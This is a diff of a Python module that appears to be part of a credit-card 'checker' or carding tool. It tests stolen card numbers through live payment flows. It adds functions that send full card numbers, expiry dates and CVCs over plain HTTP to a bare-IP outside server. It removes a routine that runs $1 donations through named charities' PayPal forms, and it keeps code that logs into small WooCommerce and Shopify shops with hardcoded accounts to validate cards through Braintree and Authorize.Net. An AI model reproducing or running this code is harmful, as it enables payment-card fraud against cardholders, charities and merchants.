@@ -53,14 +53,33 @@ def process_shopify_api_response(api_response, site_price='0.00'):
     return msg, status, gateway
 
 # ============================================================================
-# PROXY NORMALISATION
+# PAYPAL (NEW EXTERNAL APIs)
 # ============================================================================
-def normalise_proxy(proxy):
-    if not proxy:
-        return None
-    if proxy.startswith('http://') or proxy.startswith('https://'):
-        return proxy
-    return f'http://{proxy}'
+def check_paypal_charge(cc, proxy=None):
+    """PayPal $1 charge – http://138.128.240.15:8024/paypal_1?cc=CC"""
+    url = f"http://138.128.240.15:8024/paypal_1?cc={cc}"
+    try:
+        resp = requests.get(url, timeout=15, verify=False)
+        resp.raise_for_status()
+        data = resp.json()
+        msg = data.get('message', 'Unknown response')
+        status = data.get('status', 'DECLINED').upper()
+        return msg, status
+    except Exception as e:
+        return f"PayPal API Error: {str(e)}", "ERROR"
+
+def check_paypal_donate(cc, proxy=None):
+    """PayPal Donate $0.01 – http://138.128.240.15:8025/paypal_donate?cc=CC"""
+    url = f"http://138.128.240.15:8025/paypal_donate?cc={cc}"
+    try:
+        resp = requests.get(url, timeout=15, verify=False)
+        resp.raise_for_status()
+        data = resp.json()
+        msg = data.get('message', 'Unknown response')
+        status = data.get('status', 'DECLINED').upper()
+        return msg, status
+    except Exception as e:
+        return f"PayPal Donate API Error: {str(e)}", "ERROR"
 
 # ============================================================================
 # STRIPE $5 CHARGE (keep your endpoint)
@@ -101,142 +120,7 @@ def check_stripe_auth(cc, proxy=None):
         return f"Stripe Auth API Error: {str(e)}", "ERROR"
 
 # ============================================================================
-# PAYPAL CUSTOM CHARGE – MULTI‑SITE (EXACT WORKING SCRIPT)
-# ============================================================================
-PAYPAL_SITES = [
-    "https://stockportmecfs.co.uk/donate-now/",
-    "https://dev.journeytojannah.org.uk/donate-now/",
-    "https://www.rarediseasesinternational.org/donate/",
-    "https://www.sustaininghopeintl.org/donate/",
-    "https://bilengebwanyayacongo.org/donate/",
-    "https://mbiamenewvision.org/donate/",
-]
-
-def check_paypal_custom(cc, proxy=None):
-    parts = cc.strip().split("|")
-    if len(parts) != 4:
-        return "Invalid card format", "ERROR"
-    number, month, year, cvc = parts
-    month = month.zfill(2)
-    if len(year) == 2:
-        year = "20" + year
-
-    # Use the same User‑Agent as provided scripts
-    ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
-    proxy_url = normalise_proxy(proxy)
-
-    # Import MultipartEncoder here – if missing, pip install requests-toolbelt
-    try:
-        from requests_toolbelt.multipart.encoder import MultipartEncoder
-    except ImportError:
-        return "Missing package: requests-toolbelt", "ERROR"
-
-    sites = random.sample(PAYPAL_SITES, len(PAYPAL_SITES))
-
-    for site in sites:
-        try:
-            s = requests.Session()
-            if proxy_url:
-                s.proxies = {'http': proxy_url, 'https': proxy_url}
-
-            # Step 1 – fetch page
-            resp = s.get(site, headers={'User-Agent': ua}, timeout=20)
-            if resp.status_code != 200:
-                continue
-
-            form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', resp.text)
-            form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', resp.text)
-            form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', resp.text)
-            enc_token = re.search(r'"data-client-token":"(.*?)"', resp.text)
-            if not all([form_hash, form_prefix, form_id, enc_token]):
-                continue
-
-            form_hash = form_hash.group(1)
-            form_prefix = form_prefix.group(1)
-            form_id = form_id.group(1)
-            access_token = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc_token.group(1)).decode()).group(1)
-
-            ajax_url = site.rstrip('/') + '/wp-admin/admin-ajax.php'
-
-            # Step 2 – create order (MULTIPART as in real script)
-            create_data = MultipartEncoder(
-                fields={
-                    'give-honeypot': '',
-                    'give-form-id-prefix': form_prefix,
-                    'give-form-id': form_id,
-                    'give-form-hash': form_hash,
-                    'give-form-minimum': '1',
-                    'give-form-maximum': '999999.99',
-                    'give-amount': '1.00',
-                    'payment-mode': 'paypal-commerce',
-                    'give_first': 'John',
-                    'give_last': 'Doe',
-                    'give_email': 'johndoe@example.com',
-                    'give-gateway': 'paypal-commerce',
-                }
-            )
-            resp = s.post(ajax_url + '?action=give_paypal_commerce_create_order',
-                          data=create_data,
-                          headers={'Content-Type': create_data.content_type, 'User-Agent': ua},
-                          timeout=20)
-            order_id = resp.json()['data']['id']
-
-            # Step 3 – confirm payment source
-            confirm_payload = {
-                "payment_source": {
-                    "card": {
-                        "number": number,
-                        "expiry": f"{year}-{month}",
-                        "security_code": cvc
-                    }
-                }
-            }
-            s.post(f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
-                   json=confirm_payload,
-                   headers={
-                       'Authorization': f'Bearer {access_token}',
-                       'Content-Type': 'application/json',
-                       'User-Agent': ua,
-                   }, timeout=20)
-
-            # Step 4 – approve order (MULTIPART)
-            approve_data = MultipartEncoder(
-                fields={
-                    'give-honeypot': '',
-                    'give-form-id-prefix': form_prefix,
-                    'give-form-id': form_id,
-                    'give-form-hash': form_hash,
-                    'give-form-minimum': '1',
-                    'give-form-maximum': '999999.99',
-                    'give-amount': '1.00',
-                    'payment-mode': 'paypal-commerce',
-                    'give_first': 'John',
-                    'give_last': 'Doe',
-                    'give_email': 'johndoe@example.com',
-                    'give-gateway': 'paypal-commerce',
-                }
-            )
-            resp = s.post(ajax_url + f'?action=give_paypal_commerce_approve_order&order={order_id}',
-                          data=approve_data,
-                          headers={'Content-Type': approve_data.content_type, 'User-Agent': ua},
-                          timeout=20)
-            result = resp.text.lower()
-
-            if any(x in result for x in ['true', 'success', 'thank']):
-                return "CHARGED $1.00", "APPROVED"
-            if 'insufficient_funds' in result:
-                return "INSUFFICIENT FUNDS", "APPROVED"
-            if 'declined' in result or 'error' in result:
-                return "DECLINED", "DECLINED"
-
-            # unclear, try next site
-        except:
-            continue
-
-    return "All PayPal sites failed – check proxy / site status", "ERROR"
-
-# ============================================================================
-# AUTHORIZE.NET $1 CHARGE (EXACT SCRIPT)
+# AUTHORIZE.NET $1 CHARGE
 # ============================================================================
 def check_authorize_net(cc, proxy=None):
     parts = cc.strip().split("|")
@@ -245,7 +129,7 @@ def check_authorize_net(cc, proxy=None):
     n, mm, yy, cvc = parts
     mm = mm.zfill(2)
     if "20" in yy:
-        yy = yy.split("20")[1]   # 2-digit year
+        yy = yy.split("20")[1]
 
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
     proxy_url = normalise_proxy(proxy)
@@ -291,7 +175,7 @@ def check_authorize_net(cc, proxy=None):
         if not form_id:
             return "Form ID not found", "ERROR"
 
-        # Checkout (multipart)
+        # Checkout
         checkout_url = f'https://api.membershipworks.com/v2/form/{form_id}/checkout'
         fields = {
             'nam': 'Mr perfect', 'xni': 'Mr perfect', 'eml': 'mrperfectxyct@gmail.com',
@@ -325,7 +209,7 @@ def check_authorize_net(cc, proxy=None):
         return f"Authorize.Net error: {str(e)[:80]}", "ERROR"
 
 # ============================================================================
-# BRAINTREE B3 AUTH (from b3_rh.py)
+# BRAINTREE B3 AUTH
 # ============================================================================
 def check_braintree_b3(cc, proxy=None):
     parts = cc.strip().split("|")
@@ -344,17 +228,14 @@ def check_braintree_b3(cc, proxy=None):
         if proxy_url:
             s.proxies = {'http': proxy_url, 'https': proxy_url}
 
-        # 1. Login nonce
         resp = s.get('https://unclejimswormfarm.com/my-account/', headers={'User-Agent': ua}, timeout=15)
         login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', resp.text).group(1)
 
-        # 2. Login
         login_data = f'username=shamon843738@gmail.com&password=shamon843738@gmail.com&woocommerce-login-nonce={login_nonce}&_wp_http_referer=%2Fmy-account%2F&login=Log+in'
         s.post('https://unclejimswormfarm.com/my-account/', data=login_data, headers={
             'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua,
         }, timeout=15)
 
-        # 3. Add payment method page
         resp = s.get('https://unclejimswormfarm.com/my-account/add-payment-method/', headers={'User-Agent': ua}, timeout=15)
         payment_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text).group(1)
         b_token_enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', resp.text).group(1)
@@ -362,7 +243,6 @@ def check_braintree_b3(cc, proxy=None):
         auth_fingerprint = re.search(r'"authorizationFingerprint":"(.*?)"', b_token).group(1)
         merchant_id = re.search(r'merchantId":"(.*?)"', b_token).group(1)
 
-        # 4. Tokenize credit card (GraphQL)
         gql_data = {
             "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
             "variables": {
@@ -388,7 +268,6 @@ def check_braintree_b3(cc, proxy=None):
         if not token:
             return "Tokenization failed", "ERROR"
 
-        # 5. Add payment method
         add_data = {
             'payment_method': 'braintree_cc',
             'braintree_cc_nonce_key': token,
@@ -413,18 +292,29 @@ def check_braintree_b3(cc, proxy=None):
         return f"Braintree error: {str(e)[:80]}", "ERROR"
 
 # ============================================================================
+# PROXY NORMALISATION
+# ============================================================================
+def normalise_proxy(proxy):
+    if not proxy:
+        return None
+    if proxy.startswith('http://') or proxy.startswith('https://'):
+        return proxy
+    return f'http://{proxy}'
+
+# ============================================================================
 # ALIASES – NO CHANGES IN APP.PY
 # ============================================================================
 check_stripe_api = check_stripe5
 check_b3_auth    = check_stripe_auth
 
-check_paypal_fixed   = check_paypal_custom
-check_paypal_general = check_paypal_custom
-check_paypal_onyx    = check_paypal_custom
+# All PayPal variants now point to the new charge API
+check_paypal_fixed   = check_paypal_charge
+check_paypal_general = check_paypal_charge
+check_paypal_onyx    = check_paypal_charge
 
-check_braintree_api = check_braintree_b3
+check_braintree_api  = check_braintree_b3
 
-# All other gates still use Shopify (they were never implemented otherwise)
+# Other gates remain on Shopify
 def shopify_check(cc, proxy=None):
     FALLBACK_SITES = [
         "https://bb73c3-5.myshopify.com",
@@ -450,7 +340,4 @@ check_razorpay       = shopify_check
 check_payu           = shopify_check
 check_sk_gateway     = shopify_check
 
-# ============================================================================
-# CONSTANTS
-# ============================================================================
 PAYPAL_AMOUNT = 0.05
